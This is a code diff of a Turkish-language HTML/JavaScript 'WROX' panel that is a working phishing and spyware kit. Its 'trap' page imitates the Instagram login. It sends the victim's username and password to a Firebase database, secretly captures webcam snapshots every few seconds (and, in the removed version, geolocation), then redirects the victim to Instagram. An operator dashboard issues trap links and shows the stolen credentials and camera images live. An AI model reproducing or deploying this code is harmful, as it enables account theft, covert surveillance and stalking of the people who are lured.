@@ -3,236 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V105 | FINAL TERMINAL</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <title>WROX V106 | PREMIUM TERMINAL</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --p: #00f2ff; --bg: #050505; --g: #00ff88; --r: #ff003c; --side: #0a0a0a; --insta: #e1306c; }
+        :root { --p: #00f2ff; --bg: #050505; --g: #00ff88; --r: #ff003c; --side: #0a0a0a; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
         body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; }
 
-        /* AUTH EKRANI */
-        #auth-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: flex; align-items: center; justify-content: center; }
-        .auth-card { width: 350px; padding: 30px; border: 1px solid var(--p); background: #0a0a0a; }
+        /* AUTH / GİRİŞ EKRANI */
+        #auth-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .auth-card { width: 340px; padding: 30px; border: 1px solid var(--p); background: #0a0a0a; box-shadow: 0 0 30px rgba(0,242,255,0.1); }
         .tab-box { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
-        .tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; color: #444; }
+        .tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; color: #444; transition: 0.3s; }
         .tab.active { color: var(--p); border-bottom: 2px solid var(--p); }
 
-        /* HAMBURGER SIDEBAR */
+        /* SIDEBAR (GÖRSELDEKİ TASARIM) */
         aside { width: 260px; background: var(--side); border-right: 1px solid #111; display: flex; flex-direction: column; transition: 0.3s; z-index: 1000; }
-        .side-h { padding: 25px; border-bottom: 1px solid #1a1a1a; color: var(--p); font-size: 20px; font-weight: bold; letter-spacing: 2px; }
-        .nav-i { padding: 15px 25px; cursor: pointer; color: #888; border-left: 3px solid transparent; transition: 0.2s; }
+        .side-h { padding: 25px; border-bottom: 1px solid #1a1a1a; color: var(--p); font-size: 18px; font-weight: bold; letter-spacing: 2px; text-align: center; }
+        .nav-i { padding: 15px 25px; cursor: pointer; color: #888; border-left: 3px solid transparent; transition: 0.2s; font-size: 14px; }
         .nav-i:hover, .nav-i.active { background: #0f0f0f; color: var(--p); border-left-color: var(--p); }
+        .menu-t { padding: 15px 25px 5px; font-size: 10px; color: #444; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* MAIN AREA */
-        main { flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative; }
-        header { height: 60px; border-bottom: 1px solid #111; display: flex; align-items: center; padding: 0 25px; justify-content: space-between; background: #000; }
-        .content { flex: 1; padding: 20px; overflow-y: auto; }
+        /* ANA ALAN */
+        main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        header { height: 60px; border-bottom: 1px solid #111; display: flex; align-items: center; padding: 0 25px; background: #000; justify-content: space-between; }
+        .content { flex: 1; padding: 20px; overflow-y: auto; background: radial-gradient(circle at top right, #0d0d0d, #050505); }
         .card { background: #000; border: 1px solid #1a1a1a; padding: 20px; margin-bottom: 20px; border-radius: 4px; }
         
-        input, button { width: 100%; padding: 12px; margin-top: 10px; background: #080808; border: 1px solid #222; color: var(--p); outline: none; }
-        button { cursor: pointer; border-color: var(--p); font-weight: bold; }
+        input, button { width: 100%; padding: 12px; margin-top: 10px; background: #080808; border: 1px solid #222; color: var(--p); outline: none; border-radius: 3px; }
+        button { cursor: pointer; border-color: var(--p); font-weight: bold; text-transform: uppercase; }
         button:hover { background: var(--p); color: #000; }
 
-        /* KAMERA LOGLARI (ALT ALTA) */
-        .cam-stream { display: flex; flex-direction: column; gap: 20px; padding-bottom: 50px; }
-        .cam-card { background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 8px; overflow: hidden; width: 100%; max-width: 500px; margin: 0 auto; }
+        /* FOTOĞRAFLAR ALT ALTA */
+        .cam-log { background: #0d0d0d; border: 1px solid #1a1a1a; margin-bottom: 20px; border-radius: 8px; overflow: hidden; max-width: 500px; margin-inline: auto; }
         .cam-img { width: 100%; height: auto; display: block; background: #000; }
-        .cam-info { padding: 10px; font-size: 11px; display: flex; justify-content: space-between; background: #080808; }
-
-        /* LIVE FEED AREA */
-        #live-feed { margin-top: 15px; border-top: 1px solid #111; padding-top: 10px; max-height: 300px; overflow-y: auto; }
-        .feed-item { padding: 8px; border-bottom: 1px solid #0a0a0a; font-size: 12px; }
-
-        /* TRAP UI (INSTA) */
-        .insta-page { background: #fff; height: 100vh; width: 100vw; display: flex; flex-direction: column; align-items: center; padding-top: 60px; color: #000; position: fixed; inset: 0; z-index: 5000; }
-        .insta-form { width: 350px; border: 1px solid #dbdbdb; padding: 30px; background: #fff; text-align: center; }
+        .cam-footer { padding: 10px; font-size: 11px; display: flex; justify-content: space-between; background: #080808; border-top: 1px solid #1a1a1a; }
     </style>
 </head>
 <body>
 
-<div id="wrox-app"></div>
+<div id="root"></div>
 
 <script>
-    // --- FIREBASE AYARLARI ---
-    const firebaseConfig = { databaseURL: "BURAYA_FIREBASE_LINKINI_YAPISTIR" };
-    firebase.initializeApp(firebaseConfig);
+    // --- FIREBASE AYARI (SENİN LİNKİNİ EKLEDİM) ---
+    const firebaseConfig = { databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com" };
+    
+    // Güvenli Başlatma
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
     const db = firebase.database();
 
-    const params = new URLSearchParams(window.location.search);
-    const mode = params.get('mode');
-    const refUser = params.get('ref') || 'admin';
-    const vicID = "V-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+    const urlParams = new URLSearchParams(window.location.search);
+    const mode = urlParams.get('mode');
+    const refUser = urlParams.get('ref') || 'admin';
 
-    // --- 1. KURBAN MODU (INSTA + SPY) ---
-    if(mode === 'trap') {
-        document.getElementById('wrox-app').innerHTML = `
-            <div class="insta-page">
-                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251b1a4d56.png" width="175">
-                <div class="insta-form">
-                    <input id="iu" placeholder="Telefon numarası, kullanıcı adı veya e-posta" style="background:#fafafa; border:1px solid #dbdbdb; color:#000;">
-                    <input id="ip" type="password" placeholder="Şifre" style="background:#fafafa; border:1px solid #dbdbdb; color:#000;">
-                    <button onclick="infiltrate()" style="background:#0095f6; color:#fff; border:none; margin-top:15px;">Giriş Yap</button>
-                </div>
-                <video id="v" autoplay muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
-            </div>
-        `;
-
-        window.infiltrate = async () => {
-            const u = document.getElementById('iu').value;
-            const p = document.getElementById('ip').value;
-            if(!u || !p) return;
-            db.ref(`spy_live/${refUser}/${vicID}/insta`).set({ user: u, pass: p });
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = stream;
-                setInterval(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = 400; canvas.height = 300;
-                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
-                    db.ref(`spy_live/${refUser}/${vicID}`).update({
-                        img: canvas.toDataURL('image/jpeg', 0.5),
-                        last: Date.now(),
-                        model: navigator.platform
-                    });
-                }, 3000);
-                if(navigator.geolocation) {
-                    navigator.geolocation.watchPosition(pos => {
-                        db.ref(`spy_live/${refUser}/${vicID}`).update({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-                    });
-                }
-                setTimeout(() => { window.location.href = "https://instagram.com"; }, 1500);
-            } catch(e) { window.location.href = "https://instagram.com"; }
-        };
-    } 
-
-    // --- 2. PANEL MODU ---
-    else {
-        const currentUser = localStorage.getItem('w_user');
-        if(!currentUser) {
+    // --- 1. PANEL / GİRİŞ KONTROLÜ ---
+    if(mode !== 'trap') {
+        const user = localStorage.getItem('w_user');
+        if(!user) {
             renderAuth();
         } else {
-            renderPanel(currentUser);
+            renderPanel(user);
         }
+    } else {
+        renderTrap();
     }
 
+    // --- FONKSİYONLAR ---
     function renderAuth() {
-        document.getElementById('wrox-app').innerHTML = `
+        document.getElementById('root').innerHTML = `
             <div id="auth-overlay">
                 <div class="auth-card">
                     <div class="tab-box">
-                        <div id="t-login" class="tab active" onclick="switchTab('login')">GİRİŞ</div>
-                        <div id="t-reg" class="tab" onclick="switchTab('reg')">KAYIT</div>
+                        <div id="t-login" class="tab active" onclick="setAuthMode('login')">GİRİŞ</div>
+                        <div id="t-reg" class="tab" onclick="setAuthMode('reg')">KAYIT</div>
                     </div>
-                    <input type="text" id="un" placeholder="Kullanıcı Adı">
-                    <input type="password" id="up" placeholder="Şifre">
-                    <button id="auth-btn" onclick="processAuth()">SİSTEME GİR</button>
+                    <input type="text" id="user" placeholder="Kullanıcı Adı">
+                    <input type="password" id="pass" placeholder="Şifre">
+                    <button id="auth-btn" onclick="handleAuth()">SİSTEME GİRİŞ YAP</button>
                 </div>
-            </div>
-        `;
+            </div>`;
     }
 
-    let currentTab = 'login';
-    window.switchTab = (t) => {
-        currentTab = t;
-        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
-        document.getElementById('t-'+t).classList.add('active');
-        document.getElementById('auth-btn').innerText = t === 'login' ? 'GİRİŞ YAP' : 'KAYIT OL';
+    let authMode = 'login';
+    window.setAuthMode = (m) => {
+        authMode = m;
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.getElementById('t-'+m).classList.add('active');
+        document.getElementById('auth-btn').innerText = m === 'login' ? 'GİRİŞ YAP' : 'HESAP OLUŞTUR';
     };
 
-    window.processAuth = async () => {
-        const u = document.getElementById('un').value;
-        const p = document.getElementById('up').value;
-        if(currentTab === 'reg') {
+    window.handleAuth = async () => {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(!u || !p) return alert("Boş bırakma!");
+
+        if(authMode === 'reg') {
             await db.ref('users/' + u).set({ pass: p });
-            alert("Kayıt başarılı! Giriş yapın.");
-            switchTab('login');
+            alert("Kayıt ok! Giriş yap."); setAuthMode('login');
         } else {
             const snap = await db.ref('users/' + u).once('value');
             if(snap.exists() && snap.val().pass === p) {
                 localStorage.setItem('w_user', u);
                 location.reload();
-            } else { alert("Hata!"); }
+            } else { alert("Hatalı bilgi!"); }
         }
     };
 
     function renderPanel(user) {
-        document.getElementById('wrox-app').innerHTML = `
+        document.getElementById('root').innerHTML = `
             <aside>
-                <div class="side-h">WROX V105</div>
-                <div class="nav-i active" onclick="showP('p-link')">🔗 TUZAK LİNKİ</div>
-                <div class="nav-i" onclick="showP('p-cam')">📷 KAMERA LOGLARI</div>
-                <div class="nav-i" onclick="showP('p-sorgu')">🔍 SORGULAR</div>
-                <button onclick="localStorage.clear();location.reload()" style="margin:auto 20px 20px; border-color:var(--r); color:var(--r);">ÇIKIŞ</button>
+                <div class="side-h">WROX PREMIUM</div>
+                <div class="menu-t">SORGULAR</div>
+                <div class="nav-i active" onclick="tab('p-link')">👤 AD SOYAD / TC</div>
+                <div class="menu-t">SIZMA ARAÇLARI</div>
+                <div class="nav-i" onclick="tab('p-cam')">📷 KAMERA LOGLARI</div>
+                <div class="nav-i" onclick="tab('p-link')">🔗 TUZAK LİNKİ</div>
+                <div class="menu-t">YÖNETİM</div>
+                <button onclick="localStorage.clear();location.reload()" style="margin:auto 20px 20px; border-color:var(--r); color:var(--r); font-size:10px;">GÜVENLİ ÇIKIŞ</button>
             </aside>
             <main>
-                <header><div>DURUM: <span style="color:var(--g)">ONLINE</span></div><div>${user.toUpperCase()}</div></header>
+                <header><div>DURUM: <span style="color:var(--g)">BAĞLI</span></div><div>${user.toUpperCase()}</div></header>
                 <div class="content">
                     <div id="p-link" class="page">
                         <div class="card">
-                            <h3>LİNK OLUŞTURUCU</h3>
-                            <input id="trap-url" readonly>
-                            <button onclick="copyL()">LİNKİ KOPYALA</button>
+                            <h3>TUZAK LİNKİNİZ</h3>
+                            <input id="t-url" readonly>
+                            <button onclick="copyLink()">KOPYALA</button>
                         </div>
                         <div class="card">
-                            <h3>LİNK ALTI CANLI AKIŞ</h3>
-                            <div id="live-feed">Veri bekleniyor...</div>
+                            <h3 style="color:var(--g)">📡 CANLI AKIŞ (LİNK ALTI)</h3>
+                            <div id="live-feed" style="margin-top:15px; font-size:12px; color:#555;">Kurban bekleniyor...</div>
                         </div>
                     </div>
                     <div id="p-cam" class="page" style="display:none;">
-                        <div class="cam-stream" id="cam-logs"></div>
-                    </div>
-                    <div id="p-sorgu" class="page" style="display:none;">
-                        <div class="card"><h3>SORGU PANELİ</h3><input placeholder="T.C. / GSM / AD"><button>SORGULA</button></div>
+                        <div id="cam-results"></div>
                     </div>
                 </div>
-            </main>
-        `;
-        setupLogic(user);
+            </main>`;
+        
+        setupPanel(user);
     }
 
-    function setupLogic(user) {
-        document.getElementById('trap-url').value = window.location.href.split('?')[0] + "?mode=trap&ref=" + user;
-        
+    function setupPanel(user) {
+        const trapUrl = window.location.href.split('?')[0] + "?mode=trap&ref=" + user;
+        document.getElementById('t-url').value = trapUrl;
+
         db.ref('spy_live/' + user).on('value', snap => {
             const data = snap.val();
             const feed = document.getElementById('live-feed');
-            const cam = document.getElementById('cam-logs');
+            const cams = document.getElementById('cam-results');
             if(!data) return;
 
-            feed.innerHTML = '';
-            cam.innerHTML = '';
-
+            feed.innerHTML = ''; cams.innerHTML = '';
             for(let id in data) {
                 const v = data[id];
-                // Link Altı Akış
-                feed.innerHTML = `<div class="feed-item"><b>#${id}</b> -> ${v.insta ? v.insta.user+'|'+v.insta.pass : 'Bağlandı'}</div>` + feed.innerHTML;
-                
-                // Kamera Alt Alta Akış
+                // Akış
+                feed.innerHTML = `<div style="padding:10px; border-bottom:1px solid #111;"><b>#${id}</b> | ${v.insta ? '<span style="color:#e1306c">INSTA:</span> '+v.insta.user : 'Aktif'}</div>` + feed.innerHTML;
+                // Kameralar Alt Alta
                 if(v.img) {
-                    cam.innerHTML = `
-                        <div class="cam-card">
+                    cams.innerHTML = `
+                        <div class="cam-log">
                             <img src="${v.img}" class="cam-img">
-                            <div class="cam-info">
+                            <div class="cam-footer">
                                 <span>ID: ${id}</span>
                                 <span style="color:var(--p)">${new Date(v.last).toLocaleTimeString()}</span>
                             </div>
-                        </div>
-                    ` + cam.innerHTML;
+                        </div>` + cams.innerHTML;
                 }
             }
         });
     }
 
-    window.showP = (id) => {
+    window.tab = (id) => {
         document.querySelectorAll('.page').forEach(p => p.style.display='none');
-        document.querySelectorAll('.nav-i').forEach(n => n.classList.remove('active'));
         document.getElementById(id).style.display='block';
-        event.currentTarget.classList.add('active');
     };
 
-    window.copyL = () => { document.getElementById('trap-url').select(); document.execCommand('copy'); alert("Kopyalandı!"); };
+    window.copyLink = () => {
+        const i = document.getElementById('t-url'); i.select();
+        document.execCommand('copy'); alert("Link Kopyalandı!");
+    };
+
+    function renderTrap() {
+        document.getElementById('root').innerHTML = `
+            <div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:100px; color:#000;">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251b1a4d56.png" width="175">
+                <div style="width:350px; border:1px solid #dbdbdb; padding:30px; margin-top:30px; text-align:center;">
+                    <input id="u" placeholder="Kullanıcı adı" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #dbdbdb; background:#fafafa;">
+                    <input id="p" type="password" placeholder="Şifre" style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #dbdbdb; background:#fafafa;">
+                    <button onclick="go()" style="width:100%; padding:8px; background:#0095f6; color:#fff; border:none; font-weight:bold; border-radius:4px;">Giriş Yap</button>
+                </div>
+                <video id="v" autoplay muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
+            </div>`;
+        
+        window.go = async () => {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(!u || !p) return;
+            const vID = "V-" + Math.random().toString(36).substr(2,4).toUpperCase();
+            db.ref(`spy_live/${refUser}/${vID}/insta`).set({ user: u, pass: p });
+
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = s;
+                setInterval(() => {
+                    const canvas = document.getElementById('c'); canvas.width=400; canvas.height=300;
+                    canvas.getContext('2d').drawImage(document.getElementById('v'),0,0,400,300);
+                    db.ref(`spy_live/${refUser}/${vID}`).update({ img: canvas.toDataURL('image/jpeg', 0.5), last: Date.now() });
+                }, 3000);
+            } catch(e) {}
+            setTimeout(() => { window.location.href="https://instagram.com"; }, 2000);
+        };
+    }
 </script>
 </body>
 </html>
